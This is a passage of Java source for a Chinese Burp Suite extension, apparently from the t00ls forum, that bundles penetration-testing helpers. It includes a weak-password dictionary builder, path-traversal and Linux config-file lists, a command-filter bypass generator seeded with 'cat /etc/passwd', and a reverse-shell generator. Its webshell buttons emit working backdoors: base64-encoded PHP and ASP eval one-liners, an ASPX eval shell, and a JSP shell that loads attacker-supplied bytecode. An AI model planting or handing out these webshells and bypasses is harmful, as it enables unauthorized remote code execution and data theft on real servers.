package burp;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import javax.swing.*;
import java.awt.*;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Calendar;
import java.util.regex.*;
import java.util.Base64;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.Map;


public class BurpExtender implements IBurpExtender, ITab, IHttpListener
{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JTabbedPane tabs;
    public PrintWriter stdout;
    JTextArea jta;//存放日志输入
    JLabel rkl_lb_10;//用来显示生成弱口令字典数量
    String xl_version = "1.7";


    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {
        //输出
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stdout.println("hello xia Liao!");
        this.stdout.println("你好 欢迎使用 瞎料!");
        this.stdout.println("version:"+xl_version);

        // keep a reference to our callbacks object
        this.callbacks = callbacks;

        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("xp_Liao V"+xl_version);

        // create our UI
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {

                // main split pane
                JSplitPane splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                JSplitPane splitPanes = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                JSplitPane splitPanes_2 = new JSplitPane(JSplitPane.VERTICAL_SPLIT);


                //左边框的内容
                JPanel jp=new JPanel();
                jp.setLayout(new GridLayout(17, 1));
                JLabel jl_0=new JLabel("    姓名：");
                JTextField txtfield_0=new JTextField(1);
                JLabel jl_00=new JLabel("");
                JLabel jl_1=new JLabel("    手机号：");
                JTextField txtfield_1=new JTextField(1);
                JLabel jl_2=new JLabel("");
                JLabel jl_3=new JLabel("    身份证：");
                JTextField txtfield_2=new JTextField(1);
                JLabel jl_4=new JLabel("");
                JLabel jl_5=new JLabel("    统一社会信用代码：");
                JTextField txtfield_3=new JTextField(1);
                JLabel jl_6=new JLabel("");
                JLabel jl_7=new JLabel("    组织机构代码：");
                JTextField txtfield_4=new JTextField(1);
                JLabel jl_8=new JLabel("");
                JLabel jl_9=new JLabel("    银行信用卡号：");
                JTextField txtfield_5=new JTextField(1);

                //添加到面板上
                jp.add(jl_0);
                jp.add(txtfield_0);
                jp.add(jl_00);

                jp.add(jl_1);
                jp.add(txtfield_1);
                jp.add(jl_2);

                jp.add(jl_3);
                jp.add(txtfield_2);
                jp.add(jl_4);

                jp.add(jl_5);
                jp.add(txtfield_3);
                jp.add(jl_6);

                jp.add(jl_7);
                jp.add(txtfield_4);
                jp.add(jl_8);

                jp.add(jl_9);
                jp.add(txtfield_5);

                //左边框下面的内容
                JPanel jp_2=new JPanel();
                JTextArea area =new JTextArea();
                area.setText("<% response.write(\"hello,world\") %>");
                area.setRows(7);
                area.setColumns(70);
                area.setLineWrap(true);//自动换行
                area.setEditable(false);//不可编辑
                JScrollPane jsp_2=new JScrollPane(area);    //将文本域放入滚动窗口
                JButton btn3=new JButton("asp 打印hello");
                JButton btn4=new JButton("aspx 打印hello");
                JButton btn5=new JButton("php 打印hello");
                JButton btn6=new JButton("jsp 打印hello");
                JButton btn7=new JButton("asp 一句话");
                JButton btn8=new JButton("aspx 一句话");
                JButton btn9=new JButton("php 一句话");
                JButton btn10=new JButton("jsp 一句话");

                btn3.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText("<% response.write(\"hello,world\") %>");
                    }
                });
                btn4.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText("<%@ Page Language=\"C#\"%>\n" +
                                "<% Response.Write(\"hello,world\"); %>");
                    }
                });
                btn5.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText("<?php echo\"hello world\";?>");
                    }
                });
                btn6.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText("<%\n" +
                                "out.println(\"Hello World\");\n" +
                                "%>");
                    }
                });
                btn7.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText(helpers.bytesToString(helpers.base64Decode("PCVldmFsIHJlcXVlc3QoInBhc3MiKSU+")));
                    }
                });
                btn8.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText("<%@ Page Language=\"Jscript\" validateRequest=\"false\" %>\n" +
                                "<%\n" +
                                "function xxxx(str)\n" +
                                "{\n" +
                                "\treturn eval(str,\"unsafe\");\n" +
                                "}\n" +
                                "%>\n" +
                                "<%var a = Request.Item[\"pass\"];%>\n" +
                                "<%var b = xxxx(a);%>\n" +
                                "<%Response.Write(b);%>");
                    }
                });
                btn9.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText(helpers.bytesToString(helpers.base64Decode("PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+")));
                    }
                });
                btn10.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        area.setText("<%!\n" +
                                "    class U extends ClassLoader {\n" +
                                "        U(ClassLoader c) {\n" +
                                "            super(c);\n" +
                                "        }\n" +
                                "        public Class g(byte[] b) {\n" +
                                "            return super.defineClass(b, 0, b.length);\n" +
                                "        }\n" +
                                "    }\n" +
                                " \n" +
                                "    public byte[] base64Decode(String str) throws Exception {\n" +
                                "        try {\n" +
                                "            Class clazz = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                                "            return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str);\n" +
                                "        } catch (Exception e) {\n" +
                                "            Class clazz = Class.forName(\"java.util.Base64\");\n" +
                                "            Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);\n" +
                                "            return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str);\n" +
                                "        }\n" +
                                "    }\n" +
                                "%>\n" +
                                "<%\n" +
                                "    String cls = request.getParameter(\"pass\");\n" +
                                "    if (cls != null) {\n" +
                                "        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n" +
                                "    }\n" +
                                "%>");
                    }
                });


                jp_2.add(btn3);
                jp_2.add(btn4);
                jp_2.add(btn5);
                jp_2.add(btn6);
                jp_2.add(btn7);
                jp_2.add(btn8);
                jp_2.add(btn9);
                jp_2.add(btn10);
                jp_2.add(jsp_2);

                //右边框上面的内容
                JPanel jps=new JPanel();
                jps.setLayout(new GridLayout(8, 1)); //六行一列
                JLabel jls=new JLabel("插件名：瞎料 author：算命縖子");    //创建一个标签
                JLabel jls_1=new JLabel("吐司：www.t00ls.com");
                JLabel jls_2=new JLabel("版本：xp_Liao V"+xl_version);
                JLabel jls_3=new JLabel("感谢名单：Shinceho、SongS、S");
                JButton btn1=new JButton("重新生成");
                JLabel jls_4=new JLabel("");
                JLabel jls_5=new JLabel("");
                JButton btn2=new JButton("清空日志");


                //右边框下面的内容
                JPanel jps_2=new JPanel();
                jta=new JTextArea(18,16);
                jta.setLineWrap(true);//自动换行
                jta.setEditable(false);//不可编辑
                JScrollPane jsp=new JScrollPane(jta);    //将文本域放入滚动窗口


                //生成按钮
                btn1.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        txtfield_0.setText(data0_end());
                        txtfield_1.setText(data1_end());
                        txtfield_2.setText(data2_end());
                        txtfield_3.setText(data3_end());
                        txtfield_4.setText(data4_end());
                        txtfield_5.setText(data5_end());
                        jta.setText(jta.getText()+"\n\n");
                    }
                });

                //清空按钮
                btn2.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        jta.setText("");
                    }
                });

                jps.add(jls);
                jps.add(jls_1);
                jps.add(jls_2);
                jps.add(jls_3);
                jps.add(btn1);
                jps.add(jls_4);
                jps.add(jls_5);
                jps.add(btn2);

                jps_2.add(jsp);


                //弱口令生成界面排版



                // 信息生成界面
                //右边
                splitPanes.setLeftComponent(jps);//上面
                splitPanes.setRightComponent(jps_2);//下面

                //左边
                splitPanes_2.setLeftComponent(jp);//上面
                splitPanes_2.setRightComponent(jp_2);//下面

                //弱口令生成界面
                JSplitPane rkl_jp = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                //左边
                JPanel rkl_jp1=new JPanel();

                rkl_jp1.setLayout(new GridLayout(17, 2));
                JLabel rkl_lb_0=new JLabel("名字简称：",SwingConstants.RIGHT);
                JTextField rkl_tf_0=new JTextField(1);
                JLabel rkl_lb_1=new JLabel("名字全称：",SwingConstants.RIGHT);
                JTextField rkl_tf_1=new JTextField(1);
                JLabel rkl_lb_2=new JLabel("英文名：",SwingConstants.RIGHT);
                JTextField rkl_tf_2=new JTextField(1);
                JLabel rkl_lb_3=new JLabel("用户名：",SwingConstants.RIGHT);
                JTextField rkl_tf_3=new JTextField(1);
                JLabel rkl_lb_4=new JLabel("QQ号：",SwingConstants.RIGHT);
                JTextField rkl_tf_4=new JTextField(1);
                JLabel rkl_lb_5=new JLabel("出生日期：",SwingConstants.RIGHT);
                JTextField rkl_tf_5=new JTextField(1);
                JLabel rkl_lb_6=new JLabel("特殊数字：",SwingConstants.RIGHT);
                JTextField rkl_tf_6=new JTextField(1);
                JLabel rkl_lb_7=new JLabel("邮箱前缀：",SwingConstants.RIGHT);
                JTextField rkl_tf_7=new JTextField(1);
                JLabel rkl_lb_8=new JLabel("伴侣简称：",SwingConstants.RIGHT);
                JTextField rkl_tf_8=new JTextField(1);
                JLabel rkl_lb_9=new JLabel("伴侣全称：",SwingConstants.RIGHT);
                JTextField rkl_tf_9=new JTextField(1);
                JButton rkl_bt_1=new JButton("生成");
                JButton rkl_bt_2=new JButton("清空");
                rkl_lb_10=new JLabel("",SwingConstants.RIGHT);
                JLabel rkl_lb_11=new JLabel("",SwingConstants.RIGHT);
                JLabel rkl_lb_12=new JLabel("全为空则默认输出top100",SwingConstants.RIGHT);
                JLabel rkl_lb_13=new JLabel("感谢名单：吃个橘子",SwingConstants.RIGHT);

                rkl_jp1.add(rkl_lb_12);
                rkl_jp1.add(rkl_lb_13);
                rkl_jp1.add(rkl_bt_1);
                rkl_jp1.add(rkl_bt_2);
                rkl_jp1.add(rkl_lb_10);
                rkl_jp1.add(rkl_lb_11);
                rkl_jp1.add(rkl_lb_0);
                rkl_jp1.add(rkl_tf_0);
                rkl_jp1.add(rkl_lb_1);
                rkl_jp1.add(rkl_tf_1);
                rkl_jp1.add(rkl_lb_2);
                rkl_jp1.add(rkl_tf_2);
                rkl_jp1.add(rkl_lb_3);
                rkl_jp1.add(rkl_tf_3);
                rkl_jp1.add(rkl_lb_4);
                rkl_jp1.add(rkl_tf_4);
                rkl_jp1.add(rkl_lb_5);
                rkl_jp1.add(rkl_tf_5);
                rkl_jp1.add(rkl_lb_6);
                rkl_jp1.add(rkl_tf_6);
                rkl_jp1.add(rkl_lb_7);
                rkl_jp1.add(rkl_tf_7);
                rkl_jp1.add(rkl_lb_8);
                rkl_jp1.add(rkl_tf_8);
                rkl_jp1.add(rkl_lb_9);
                rkl_jp1.add(rkl_tf_9);

                //右边
                JPanel rkl_jp2=new JPanel();

                JTextArea rkl_ta_1 =new JTextArea();
                rkl_ta_1.setText("");
                rkl_ta_1.setRows(30);
                rkl_ta_1.setColumns(30);
                rkl_ta_1.setLineWrap(true);//自动换行
                rkl_ta_1.setEditable(false);//不可编辑
                JScrollPane rkl_sp_1 =new JScrollPane(rkl_ta_1);    //将文本域放入滚动窗口

                rkl_jp2.setLayout(new GridLayout(1, 1));
                rkl_jp2.add(rkl_sp_1);

                //生成按钮
                rkl_bt_1.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        rkl_ta_1.setText(data6_end(rkl_tf_0.getText(),rkl_tf_1.getText(),rkl_tf_2.getText(),rkl_tf_3.getText(),rkl_tf_4.getText(),rkl_tf_5.getText(),rkl_tf_6.getText(),rkl_tf_7.getText(),rkl_tf_8.getText(),rkl_tf_9.getText()));
                    }
                });
                //清空按钮
                rkl_bt_2.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        rkl_ta_1.setText("");
                        rkl_lb_10.setText("");

                        rkl_tf_0.setText("");
                        rkl_tf_1.setText("");
                        rkl_tf_2.setText("");
                        rkl_tf_3.setText("");
                        rkl_tf_4.setText("");
                        rkl_tf_5.setText("");
                        rkl_tf_6.setText("");
                        rkl_tf_7.setText("");
                        rkl_tf_8.setText("");
                        rkl_tf_9.setText("");
                    }
                });


                //路径字典
                JPanel dir_path = new JPanel();
                JLabel dir_lb_1 = new JLabel("    跨目录");
                JTextArea dir_ta_1 = new JTextArea(15,40);
                dir_ta_1.setEditable(false);//不可编辑状态
                JScrollPane dir_sp_1 =new JScrollPane(dir_ta_1);    //将文本域放入滚动窗口
                String dir_tmep_data_1 = "";
                String dir_tmep_data_2 = "";
                for(int i=0;i<20;i++){
                    dir_tmep_data_1 +="../";
                    dir_tmep_data_2 += dir_tmep_data_1+"\n";
                }
                dir_ta_1.setText(dir_tmep_data_2);
                dir_ta_1.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上

                JLabel dir_lb_2 = new JLabel("    linux常见路径");
                JTextArea dir_ta_2 = new JTextArea(15,40);
                dir_ta_2.setEditable(false);//不可编辑状态
                JScrollPane dir_sp_2 =new JScrollPane(dir_ta_2);    //将文本域放入滚动窗口
                dir_ta_2.setText(linux_path());
                dir_ta_2.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上

                JLabel dir_lb_3 = new JLabel("    linux配置文件路径");
                JTextArea dir_ta_3 = new JTextArea(15,40);
                dir_ta_3.setEditable(false);//不可编辑状态
                JScrollPane dir_sp_3 =new JScrollPane(dir_ta_3);    //将文本域放入滚动窗口
                dir_ta_3.setText(linux_config());
                dir_ta_3.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上

                JLabel dir_lb_4 = new JLabel("    linux日志路径");
                JTextArea dir_ta_4 = new JTextArea(15,40);
                dir_ta_4.setEditable(false);//不可编辑状态
                JScrollPane dir_sp_4 =new JScrollPane(dir_ta_4);    //将文本域放入滚动窗口
                dir_ta_4.setText(linux_log());
                dir_ta_4.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上

                dir_path.add(dir_lb_1);
                dir_path.add(dir_sp_1);
                dir_path.add(dir_lb_2);
                dir_path.add(dir_sp_2);
                dir_path.add(dir_lb_3);
                dir_path.add(dir_sp_3);
                dir_path.add(dir_lb_4);
                dir_path.add(dir_sp_4);
                //指定面板的布局为GridLayout，4行2列，间隙为0
                dir_path.setLayout(new GridLayout(4,2,5,5));

                //临时笔记
                JPanel temp_notepad = new JPanel();
                temp_notepad.setLayout(new GridLayout(1, 1));
                JTextArea temp_notepad_ta_1 = new JTextArea(15,40);
                JScrollPane temp_notepad_sp_1 =new JScrollPane(temp_notepad_ta_1);    //将文本域放入滚动窗口
                temp_notepad.add(temp_notepad_sp_1);

                //数据库表/字段
                JSplitPane sql_data = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);//左右
                JPanel sql_data_z = new JPanel();//左
                JTextArea sql_data_ta_1 = new JTextArea(15,40);
                sql_data_ta_1.setText(sql_tabales());
                sql_data_ta_1.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
                sql_data_ta_1.setEditable(false);//不可编辑状态
                JScrollPane sql_sp_1 =new JScrollPane(sql_data_ta_1);    //将文本域放入滚动窗口
                sql_data_z.setLayout(new GridLayout(1, 1));
                sql_data_z.add(sql_sp_1);
                JPanel sql_data_y = new JPanel();//右
                JTextArea sql_data_ta_2 = new JTextArea(15,40);
                sql_data_ta_2.setText(sql_columns());
                sql_data_ta_2.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
                sql_data_ta_2.setEditable(false);//不可编辑状态
                JScrollPane sql_sp_2 =new JScrollPane(sql_data_ta_2);    //将文本域放入滚动窗口
                sql_data_y.setLayout(new GridLayout(1, 1));
                sql_data_y.add(sql_sp_2);
                sql_data.setLeftComponent(sql_data_z);//添加在左面
                sql_data.setRightComponent(sql_data_y);//添加在右面


                //Windows在线进程/杀软识别
                JSplitPane tasklist = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);//左右
                JPanel tasklist_data_z = new JPanel();//右
                JTextArea tasklist_data_ta_1 = new JTextArea();
                tasklist_data_ta_1.setText(windows_command());
                tasklist_data_ta_1.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
                tasklist_data_ta_1.setEditable(false);//不可编辑状态
                JScrollPane tasklist_sp_1 =new JScrollPane(tasklist_data_ta_1);    //将文本域放入滚动窗口
                tasklist_data_z.setLayout(new GridLayout(1, 1));
                tasklist_data_z.add(tasklist_sp_1);
                JSplitPane tasklist_data_y = new JSplitPane(JSplitPane.VERTICAL_SPLIT);//右
                JPanel tasklist_y_s = new JPanel();//左上
                JButton tasklist_btn1=new JButton("本地查询");
                JButton tasklist_btn2=new JButton("在线查询（比较全）");
                JLabel tasklist_lb_1 = new JLabel("感谢小白提供的在线查询接口");
                tasklist_y_s.add(tasklist_btn1);
                tasklist_y_s.add(tasklist_btn2);
                tasklist_y_s.add(tasklist_lb_1);
                JPanel tasklist_y_x = new JPanel();//左下
                JTextArea tasklist_data_ta_2 = new JTextArea(15,40);
                tasklist_data_ta_2.setText("");
                //tasklist_data_ta_2.setEditable(false);//不可编辑状态
                JScrollPane tasklist_sp_2 =new JScrollPane(tasklist_data_ta_2);    //将文本域放入滚动窗口
                tasklist_y_x.setLayout(new GridLayout(2, 1));
                tasklist_y_x.add(tasklist_sp_2);
                JTextArea tasklist_data_ta_3 = new JTextArea(15,40);
                tasklist_data_ta_3.setText("等待查询……");
                tasklist_data_ta_3.setEditable(false);//不可编辑状态
                JScrollPane tasklist_sp_3 =new JScrollPane(tasklist_data_ta_3);    //将文本域放入滚动窗口
                tasklist_y_x.setLayout(new GridLayout(2, 1));
                tasklist_y_x.add(tasklist_sp_2);
                tasklist_y_x.add(tasklist_sp_3);
                //本地查询
                tasklist_btn1.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        tasklist_data_ta_3.setText(windows_local_tasklist(tasklist_data_ta_2.getText()));
                    }
                });
                //在线查询
                tasklist_btn2.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        tasklist_data_ta_3.setText(windows_api_tasklist(tasklist_data_ta_2.getText()));
                    }
                });
                tasklist_data_y.setLeftComponent(tasklist_y_s);//添加在上面
                tasklist_data_y.setRightComponent(tasklist_y_x);//添加在下面
                tasklist.setLeftComponent(tasklist_data_y);//添加在左面
                tasklist.setRightComponent(tasklist_data_z);//添加在右面


                //命令 Bypass
                JPanel command_Bypass = new JPanel();
                command_Bypass.setLayout(new GridLayout(6,1,5,5));
                JTextArea command_Bypass_ta_1 = new JTextArea(15,40);
                command_Bypass_ta_1.setText("cat /etc/passwd");
                JScrollPane command_Bypass_sp_1 =new JScrollPane(command_Bypass_ta_1);    //将文本域放入滚动窗口
                JButton command_Bypass_ok=new JButton("Bypass命令");


                JTextArea command_Bypass_ta_2 = new JTextArea();
                command_Bypass_ta_2.setBackground(Color.LIGHT_GRAY);    //设置背景色
                command_Bypass_ta_2.setEditable(false);//不可编辑状态
                JScrollPane command_Bypass_sp_2 =new JScrollPane(command_Bypass_ta_2);    //将文本域放入滚动窗口
                JTextArea command_Bypass_ta_3 = new JTextArea();
                command_Bypass_ta_3.setBackground(Color.LIGHT_GRAY);    //设置背景色
                command_Bypass_ta_3.setEditable(false);//不可编辑状态
                JScrollPane command_Bypass_sp_3 =new JScrollPane(command_Bypass_ta_3);    //将文本域放入滚动窗口
                JTextArea command_Bypass_ta_4 = new JTextArea();
                command_Bypass_ta_4.setBackground(Color.LIGHT_GRAY);    //设置背景色
                command_Bypass_ta_4.setEditable(false);//不可编辑状态
                JScrollPane command_Bypass_sp_4 =new JScrollPane(command_Bypass_ta_4);    //将文本域放入滚动窗口
                JTextArea command_Bypass_ta_5 = new JTextArea();
                command_Bypass_ta_5.setBackground(Color.LIGHT_GRAY);    //设置背景色
                command_Bypass_ta_5.setEditable(false);//不可编辑状态
                JScrollPane command_Bypass_sp_5 =new JScrollPane(command_Bypass_ta_5);    //将文本域放入滚动窗口

                //先执行一遍，把文本框填充一下，不容空空如也，不好看
                String[] command_Bypass_list = command_Bypass_get(command_Bypass_ta_1.getText());
                command_Bypass_ta_2.setText(command_Bypass_list[0]);
                command_Bypass_ta_3.setText(command_Bypass_list[1]);
                command_Bypass_ta_4.setText(command_Bypass_list[2]);
                command_Bypass_ta_5.setText(command_Bypass_list[3]);


                command_Bypass_ok.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        String[] command_Bypass_list = command_Bypass_get(command_Bypass_ta_1.getText());
                        command_Bypass_ta_2.setText(command_Bypass_list[0]);
                        command_Bypass_ta_3.setText(command_Bypass_list[1]);
                        command_Bypass_ta_4.setText(command_Bypass_list[2]);
                        command_Bypass_ta_5.setText(command_Bypass_list[3]);
                    }
                });

                command_Bypass.add(command_Bypass_sp_1);
                command_Bypass.add(command_Bypass_ok);
                command_Bypass.add(command_Bypass_sp_2);
                command_Bypass.add(command_Bypass_sp_3);
                command_Bypass.add(command_Bypass_sp_4);
                command_Bypass.add(command_Bypass_sp_5);

                //反弹shell界面
                JSplitPane ftx_jp = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                JPanel ftx_jp_1 = new JPanel();//上面
                ftx_jp_1.setLayout(new GridLayout(1,10,10,5));
                JLabel ftx_lb_1=new JLabel("ip:",SwingConstants.RIGHT);
                JTextField ftx_txtfield_1=new JTextField("127.0.0.1",1);
                JLabel ftx_lb_2=new JLabel("端口:",SwingConstants.RIGHT);
                JTextField ftx_txtfield_2=new JTextField("8080",1);
                JButton ftx_bt_1 = new JButton("生成");
                ftx_jp_1.add(ftx_lb_1);
                ftx_jp_1.add(ftx_txtfield_1);
                ftx_jp_1.add(ftx_lb_2);
                ftx_jp_1.add(ftx_txtfield_2);
                ftx_jp_1.add(ftx_bt_1);
                JPanel ftx_jp_2 = new JPanel();//下面
                ftx_jp_2.setLayout(new GridLayout(25,1,5,8));
                JLabel ftx_lb_2_1 = new JLabel("Bash TCP:");
                JTextField ftx_txtfield_2_1=new JTextField("",1);
                ftx_txtfield_2_1.setEditable(false);
                ftx_txtfield_2_1.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_2=new JTextField("",1);
                ftx_txtfield_2_2.setEditable(false);
                ftx_txtfield_2_2.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_3=new JTextField("",1);
                ftx_txtfield_2_3.setEditable(false);
                ftx_txtfield_2_3.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_4=new JTextField("",1);
                ftx_txtfield_2_4.setEditable(false);
                ftx_txtfield_2_4.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_5=new JTextField("",1);
                ftx_txtfield_2_5.setEditable(false);
                ftx_txtfield_2_5.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JLabel ftx_lb_2_2 = new JLabel("Bash UDP:");
                JTextField ftx_txtfield_2_6=new JTextField("",1);
                ftx_txtfield_2_6.setEditable(false);
                ftx_txtfield_2_6.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_7=new JTextField("",1);
                ftx_txtfield_2_7.setEditable(false);
                ftx_txtfield_2_7.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JLabel ftx_lb_2_3 = new JLabel("Python:");
                JTextField ftx_txtfield_2_8=new JTextField("",1);
                ftx_txtfield_2_8.setEditable(false);
                ftx_txtfield_2_8.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_9=new JTextField("",1);
                ftx_txtfield_2_9.setEditable(false);
                ftx_txtfield_2_9.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_10=new JTextField("",1);
                ftx_txtfield_2_10.setEditable(false);
                ftx_txtfield_2_10.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JLabel ftx_lb_2_4 = new JLabel("PHP:");
                JTextField ftx_txtfield_2_11=new JTextField("",1);
                ftx_txtfield_2_11.setEditable(false);
                ftx_txtfield_2_11.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_12=new JTextField("",1);
                ftx_txtfield_2_12.setEditable(false);
                ftx_txtfield_2_12.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_13=new JTextField("",1);
                ftx_txtfield_2_13.setEditable(false);
                ftx_txtfield_2_13.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_14=new JTextField("",1);
                ftx_txtfield_2_14.setEditable(false);
                ftx_txtfield_2_14.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JLabel ftx_lb_2_5 = new JLabel("Ruby:");
                JTextField ftx_txtfield_2_15=new JTextField("",1);
                ftx_txtfield_2_15.setEditable(false);
                ftx_txtfield_2_15.setBackground(Color.LIGHT_GRAY);    //设置背景色
                JTextField ftx_txtfield_2_16=new JTextField("",1);
                ftx_txtfield_2_16.setEditable(false);
                ftx_txtfield_2_16.setBackground(Color.LIGHT_GRAY);    //设置背景色

                ftx_jp_2.add(ftx_lb_2_1);
                ftx_jp_2.add(ftx_txtfield_2_1);
                ftx_jp_2.add(ftx_txtfield_2_2);
                ftx_jp_2.add(ftx_txtfield_2_3);
                ftx_jp_2.add(ftx_txtfield_2_4);
                ftx_jp_2.add(ftx_txtfield_2_5);
                ftx_jp_2.add(ftx_lb_2_2);
                ftx_jp_2.add(ftx_txtfield_2_6);
                ftx_jp_2.add(ftx_txtfield_2_7);
                ftx_jp_2.add(ftx_lb_2_3);
                ftx_jp_2.add(ftx_txtfield_2_8);
                ftx_jp_2.add(ftx_txtfield_2_9);
                ftx_jp_2.add(ftx_txtfield_2_10);
                ftx_jp_2.add(ftx_lb_2_4);
                ftx_jp_2.add(ftx_txtfield_2_11);
                ftx_jp_2.add(ftx_txtfield_2_12);
                ftx_jp_2.add(ftx_txtfield_2_13);
                ftx_jp_2.add(ftx_txtfield_2_14);
                ftx_jp_2.add(ftx_lb_2_5);
                ftx_jp_2.add(ftx_txtfield_2_15);
                ftx_jp_2.add(ftx_txtfield_2_16);

                ftx_jp.setLeftComponent(ftx_jp_1);
                ftx_jp.setRightComponent(ftx_jp_2);

                ftx_bt_1.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    String[] reverse_shell_list = reverse_shell(ftx_txtfield_1.getText(),ftx_txtfield_2.getText());
                    ftx_txtfield_2_1.setText(reverse_shell_list[0]);
                    ftx_txtfield_2_2.setText(reverse_shell_list[1]);
                    ftx_txtfield_2_3.setText(reverse_shell_list[2]);
                    ftx_txtfield_2_4.setText(reverse_shell_list[3]);
                    ftx_txtfield_2_5.setText(reverse_shell_list[4]);
                    ftx_txtfield_2_6.setText(reverse_shell_list[5]);
                    ftx_txtfield_2_7.setText(reverse_shell_list[6]);
                    ftx_txtfield_2_8.setText(reverse_shell_list[7]);
                    ftx_txtfield_2_9.setText(reverse_shell_list[8]);
                    ftx_txtfield_2_10.setText(reverse_shell_list[9]);
                    ftx_txtfield_2_11.setText(reverse_shell_list[10]);
                    ftx_txtfield_2_12.setText(reverse_shell_list[11]);
                    ftx_txtfield_2_13.setText(reverse_shell_list[12]);
                    ftx_txtfield_2_14.setText(reverse_shell_list[13]);
                    ftx_txtfield_2_15.setText(reverse_shell_list[14]);
                    ftx_txtfield_2_16.setText(reverse_shell_list[15]);
                    }
                });

                //格式转换
                JPanel gszh_jp = new JPanel();
                gszh_jp.setLayout(new GridLayout(25,1,10,5));
                JLabel gszh_lb_1 = new JLabel("请输入URL格式/json格式，进行转换");
                JTextField gszh_tf_1 = new JTextField("username=admin&password=123456");
                JButton gszh_bt_1 = new JButton("转换");
                JTextField gszh_tf_2 = new JTextField("");
                gszh_tf_2.setEditable(false);
                gszh_tf_2.setBackground(Color.LIGHT_GRAY);    //设置背景色
                gszh_jp.add(gszh_lb_1);
                gszh_jp.add(gszh_tf_1);
                gszh_jp.add(gszh_bt_1);
                gszh_jp.add(gszh_tf_2);

                gszh_bt_1.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        gszh_tf_2.setText(convert_data(gszh_tf_1.getText()));
                    }
                });




                //主界面
                tabs = new JTabbedPane();
                tabs.addTab("信息生成",splitPane);
                tabs.addTab("弱口令生成",rkl_jp);
                tabs.addTab("路径字典",dir_path);
                tabs.addTab("临时笔记",temp_notepad);
                tabs.addTab("数据库表/字段",sql_data);
                tabs.addTab("Windows在线进程/杀软识别",tasklist);
                tabs.addTab("命令Bypass",command_Bypass);
                tabs.addTab("反弹shell生成",ftx_jp);
                tabs.addTab("格式转换（URL格式/json格式）",gszh_jp);

                // 信息生成界面 整体分布
                splitPane.setLeftComponent(splitPanes_2);//添加在左面
                splitPane.setRightComponent(splitPanes);//添加在右面
                splitPane.setDividerLocation(1000);//设置分割的大小

                // 信息生成界面 整体分布
                rkl_jp.setLeftComponent(rkl_jp1);//添加在左面
